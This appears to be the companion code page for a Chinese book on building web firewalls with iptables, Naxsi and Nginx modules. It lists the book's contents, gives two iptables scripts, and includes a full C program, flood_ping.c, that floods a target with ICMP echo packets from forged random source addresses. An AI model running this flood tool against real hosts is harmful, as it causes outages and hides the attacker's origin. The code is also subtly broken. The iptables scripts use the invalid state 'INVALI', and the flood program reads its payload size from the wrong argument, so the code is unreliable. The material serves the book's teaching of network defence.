#
```
從實踐中學習 Web 防火牆構建
張博 編著  機械工業  2020-06-01
ISBN:7111657047
ISBN-13:9787111657040

https://github.com/limithit/book_code
```
```
第1章iptables使用簡介1
1.1 iptables防火牆1
1.2基本概念1
1.2.1 iptables包含表3
1.2.2 iptables包含鏈3
1.2.3連接狀態4
1.2.4 iptables規則4
1.2.5具體目標5
1.2 .6 iptables擴展模塊5
1.3安裝iptables5
1.3.1內核設置5
1.3.2 iptables安裝方式6
1.4配置和使用8
1.4.1 nftables防火牆8
1.4.2 iptables的缺點8
1.4.3 nftables與iptables的主要區別9
1.4.4從iptables遷移到nftables10
1.4.5 iptables語法11
1.4.6顯示當前規則16
1.4.7重置規則16
1.4.8編輯規則16
1.4.9保存和恢復規則17
1.4.10實例應用17

第2章網絡層的安全與防禦20
2.1 IP標頭和TCP段結構20
2.1.1 IPv4標頭結構20
2.1.2 IPv6標頭結構24
2.1.3 TCP段結構25
2.1.4 TCP協議操作27
2.1.5 TCP連接建立28
2.1.6 TCP連接終止28
2.1.7 TCP資源使用29
2.1.8 TCP數據傳輸29
2.2記錄IP標頭信息34
2.2 .1使用tshark記錄標頭信息34
2.2.2使用iptables記錄標頭信息35
2.3網絡層攻擊定義36
2.4網絡層攻擊37
2.5網絡層防禦41

第3章傳輸層的安全與防禦42
3.1記錄傳輸層標頭信息42
3.1.1使用iptables記錄TCP標頭42
3.1.2使用tshark記錄TCP標頭43
3.1.3使用iptables記錄UDP標頭43
3.1.4使用tshark記錄UDP標頭44
3.1.5 UDP屬性44
3.2傳輸層攻擊定義45
3.3傳輸層攻擊類型45
3.3.1 TCP攻擊45
3.3.2 UDP攻擊48
3.3.3信息收集50
3.4傳輸層防御手段52

第4章應用層的安全與防禦55
4.1 iptables字符串匹配模塊55
4.2應用層攻擊定義56
4.3應用層攻擊類型56
4.3.1緩衝區溢出攻擊57
4.3.2釣魚式攻擊57
4.3.3後門攻擊57
4.3.4 Web攻擊58
4.3.5應用層DDoS61
4.3.6 **攻擊61
4.4應用層防禦手段62
4.4.1緩衝區溢出63
4.4.2釣魚式63
4.4.3後門63
4.4.4 Web攻擊64
4.4.5應用層DDoS64
4.4.6網絡**65

第5章Web防火牆類型66
5.1 Web防火牆簡介66
5.2 Web防火牆歷史67
5.3 WAF與常規防火牆的區別68
5.4部署方式68
5.5 Web防火牆的類型71
5.6各類防火牆的優缺點72

第6章Naxsi Web防火牆73
6.1 Naxsi簡介73
6.2 Naxsi安裝73
6.2.1編譯Naxsi73
6.2.2基本配置74
6.3 Naxsi配置指令76
6.3.1白名單76
6.3.2規則77
6.3.3 CheckRule79
6.3.4請求拒絕80
6.3.5指令索引80
6.3.6匹配規則82
6.4 Naxsi基礎使用84
6.5 Naxsi格式解析91
6.5.1 Raw_body91
6.5.2 libinjection92
6.5.3 JSON格式93
6.5.4運行時修飾符94
6.6示例95
6.6.1白名單示例95
6.6.2規則示例97
6.7 Naxsi深入探索98
6.7.1 Naxsi日誌98
6.7.2內部規則100
6.7.3與Fail2Ban整合102

第7章ngx_dynamic_limit_req_module動態限流104
7.1實現原理104
7.1.1限流算法104
7.1.2應用場景106
7.1.3安裝107
7.2功能108
7.2.1 CC防卸108
7.2.2暴力破解108
7.2.3惡意刷接口108
7.2.4分佈式代理惡意請求109
7.2.5動態定時攔截109
7.2.6黑名單和白名單110
7.3配置指令110
7.3.1 dynamic_limit_req_zone設置區域參數111
7.3.2 dynamic_limit_req設置隊列114
7.3.3 dynamic_limit_req_log_level設置日誌級別114
7.3.4 dynamic_limit_req_status設置響應狀態115
7.3.5 black-and-white-list設置黑名單和白名單115
7.4擴展功能115
7.4.1 API實時計數、PV、UV統計115
7.4.2 API閾值通知116

第8章RedisPushIptables模塊120
8.1 RedisPushIptables簡介120
8.2 RedisPushIptables與Fail2Ban比較120
8.2.1 Fail2Ban的特徵120
8.2.2 RedisPushIptables的特徵121
8.3安裝RedisPushIptables122
8.4動態刪除配置124
8.5 RedisPushIptables指令125
8.6客戶端API示例125
8.6.1 C語言編程125
8.6.2 Python語言編程126
8.6.3 Bash語言編程128
8.6.4 Lua語言編程128

第9章構建自己的WAF130
9.1安裝所需軟件130
9.2參數配置131
9.3白名單生成133
9.4白名單自動化生成138
9.5整合Fail2ban144
9.6定制開發Naxsi146
9.7 Naxsi已知漏洞151
9.8多層防禦整合後對比156
9.9可能存在的瓶頸157
9.10惡意IP庫157

第10章Nginx開髮指南158
10.1基本概念158
10.1.1源碼目錄158
10.1.2引用頭文件159
10.1.3整型封裝160
10.1.4函數返回值160
10.1.5錯誤處理161
10.2字符串161
10.2.1字符串操作162
10.2. 2格式化字符串163
10.2.3數字轉換函數164
10.2.4正則表達式165
10.3日誌時間格式166
10.4數據結構167
10.4.1數組167
10.4.2單向鍊錶168
10.4.3雙向鍊錶170
10.4.4紅黑樹171
10.4.5散列表171
10.5內存管理173
10.5.1堆173
10.5.2池174
10.5.3共享內存175
10.6日誌記錄177
10.7結構體178
10.7.1 ngx_cycle_t循環結構體178
10.7.2 ngx_buf_t緩衝區結構體179
10.7.3 ngx_connection_t連接結構體180
10.7.4 ngx_event_t結構體182
10.8事件183
10.8 .1 I/O事件183
10.8.2定時器事件184
10.8.3發布事件184
10.8.4事件循環186
10.9進程186
10.10線程188
10.11模塊189
10.11.1添加模塊189
10.11.2核心模塊190
10.11.3配置指令193
10.12 HTTP框架195
10.12.1連接195
10.12.2請求196
10.12.3配置200
10.12.4請求階段202
10.13 HTTP框架執行流程203
10.13.1請求重定向203
10.13.2子請求204
10.13.3請求*終確定206
10.13.4請求的主體208
10.13.5響應210
10.13.6響應頭210
10.13.7響應的主體211
10.14變量212
10.14.1簡單變量212
10.14.2複雜變量215
10.15負載均衡216

第11章Nginx高級主題220
11.1模塊轉換220
11.1.1先決條件220
11.1 .2編譯動態模塊220
11.1.3加載動態模塊221
11.1.4轉換config文件221
11.2模塊編譯222
11.3 config文件222
11.3.1新的config文件222
11.3.2舊的config文件223
11.4 Nginx調試224
11.4. 1調試日誌224
11.4.2核心轉儲225
11.4.3套接字洩露225
11.5示例226

第12章Redis模塊編寫231
12.1模塊簡介231
12.1.1加載模塊231
12.1.2 *簡單的模塊232
12.1.3模塊初始化232
12.2模塊API233
12.3 RedisPushIptables代碼拆解235

第13章後門分析與監測244
13.1溯源步驟和攻擊示例244
13.1.1溯源思路244
13.1.2後門類型245
13.1.3逆向分析245
13.1.4網絡監測245
13.1.5用戶空間Rootkit示例246
13.1.6內核空間Rootkit示例249
13.2修補漏洞253
13.2.1虛擬補丁253
13.2.2補丁253
13.3監測主機異常253
13.3.1靜態編譯檢測工具254
13.3.2流量異常254
13.3.3磁盤I/O異常、CPU異常和MEM異常255
13.3.4主動連接監視256
```

# ch1
## firewall.sh
```
#!/bin/sh
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X
iptables -t raw -F
iptables -t raw -X
iptables -t security -F
iptables -t security -X
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -m state --state INVALI -j DROP
iptables -A INPUT -i lo -j ACCEPT
#iptables -A INPUT -p icmp -j ACCEPT #注意在shell腳本中’#’符號是注釋，icmp是禁ping
iptables -A INPUT -p tcp -m multiport --dports 80,443  -j ACCEPT
iptables -A INPUT -s 192.168.18.0/24 -j ACCEPT
```
## nat.sh
```
#!/bin/sh
echo "1" > /proc/sys/net/ipv4/ip_forward  #作為閘道使用時需要打開轉發
#永久生效的話，需要修改sysctl.conf：net.ipv4.ip_forward = 1執行sysctl -p馬上生效
iptables -F
iptables -t nat -F
iptables -X
iptables -Z
iptables -t nat -X
iptables -t nat -Z
iptables -t mangle -F
iptables -t mangle -X
iptables -t mangle -Z
iptables -t nat -A POSTROUTING -s 192.168.0.0/16 -j SNAT --to-source 1.1.1.1 
#至少兩個網卡這裡eth1是外網假設位址為1.1.1.1
#eth0是內網連通192.168.18.0/24網段
#如果使用拔號方式就使用 MASQUERADE這種方式比較消耗記憶體
#iptables -t nat -A POSTROUTING -s 192.168.0.0/16 -o ppp0 -j MASQUERADE
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -m state --state INVALI -j DROP
iptables -A INPUT -s 192.168.0.0/16 -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A FORWARD -i eth1 -o eth0 -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A FORWARD -i eth1 -o eth0 -m state --state INVALI -j DROP
iptables -A FORWARD -s 192.168.18.0/24 -j ACCEPT #允許內網位址nat方式連網
```

# ch2 flood_ping.c
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <unistd.h>
typedef unsigned char u8; /* 自訂類型u8類型 */
typedef unsigned short int u16; /*  同上 */
unsigned short in_cksum(unsigned short *ptr, int nbytes); /* 聲明函數原型 */
void help(const char *p); /* 同上 */
int main(int argc, char **argv)
{
	if (argc < 2)  /* 如果參數小於2個就退出 */
	{
		printf("usage: %s <destination IP> [payload size]\n", argv[0]);
		exit(0);
	}
/* 定義用於目的和源地直的變數 */
	unsigned long daddr;
	unsigned long saddr;
	int payload_size = 0, sent, sent_size;
	daddr = inet_addr(argv[1]); /*將一個點分十進位的IP轉換成一個長整數型數*/
	if (argc > 2)
	{
		payload_size = atoi(argv[1]);
	}
	int sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW); /*創建socket描述符*/
	if (sockfd < 0) /*如果創建失敗就退出*/
	{
		perror("could not create socket");
		return (0);
	}
	int on = 1;
/*設置與某個通訊端關聯的選項，如果失敗則退出 */
	if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&on, sizeof (on)) == -1) 
	{
		perror("setsockopt");
		return (0);
	}
	if (setsockopt (sockfd, SOL_SOCKET, SO_BROADCAST, (const char*)&on, sizeof (on)) == -1) 
	{
		perror("setsockopt");
		return (0);
	}	
	int packet_size = sizeof (struct iphdr) + sizeof (struct icmphdr) + payload_size;
	char *packet = (char *) malloc (packet_size); /*申請用於資料存放*/
	if (!packet) /*如果申請記憶體失敗則退出*/
	{
		perror("out of memory");
		close(sockfd);
		return (0);
	}
/* 定義ip資料結構和icmp資料包結構*/
	struct iphdr *ip = (struct iphdr *) packet;
	struct icmphdr *icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));
	memset (packet, 0, packet_size); /*初始化數據包*/
/* 設置資料包選項值*/
	ip->version = 4;
	ip->ihl = 5;
	ip->tos = 0;
	ip->tot_len = htons (packet_size);
	ip->id = rand ();
	ip->frag_off = 0;
	//ip->ttl = 255;
	ip->protocol = IPPROTO_ICMP;
	ip->saddr = random();/*隨機生成IP地址*/
	ip->daddr = daddr;
	icmp->type = ICMP_ECHO;
	icmp->code = 0;
	icmp->un.echo.sequence = rand();
	icmp->un.echo.id = rand();
	icmp->checksum = 0;
	struct sockaddr_in servaddr;
	servaddr.sin_family = AF_INET; /*使用 IPv4 進行通信*/
	servaddr.sin_addr.s_addr = daddr;
	memset(&servaddr.sin_zero, 0, sizeof (servaddr.sin_zero));
	puts("flooding...");
	while (1) /*間隔10000微秒，迴圈發送資料包*/
	{
		memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), rand() % 255, payload_size);
		ip->saddr=random();  
ip->ttl = random();
		icmp->checksum = 0;
		icmp->checksum = in_cksum((unsigned short *)icmp, sizeof(struct icmphdr) + payload_size);
		if ( (sent_size = sendto(sockfd, packet, packet_size, 0, (struct sockaddr*) &servaddr, sizeof (servaddr))) < 1) 
		{
			perror("send failed\n");
			break;
		}
		++sent;
		printf("%d packets sent\r", sent);
		fflush(stdout);
		usleep(10000);	//microseconds
	}
	free(packet);  /*釋放申請的記憶體*/
	close(sockfd);  /*關閉描述符*/
	return (0);
}
unsigned short in_cksum(unsigned short *ptr, int nbytes) /*檢查資料*/
{
	register long sum;
	u_short oddbyte;
	register u_short answer;
	sum = 0;
	while (nbytes > 1) {
		sum += *ptr++;
		nbytes -= 2;
	}
	if (nbytes == 1) {
		oddbyte = 0;
		*((u_char *) & oddbyte) = *(u_char *) ptr;
		sum += oddbyte;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;
	return (answer);
}

```
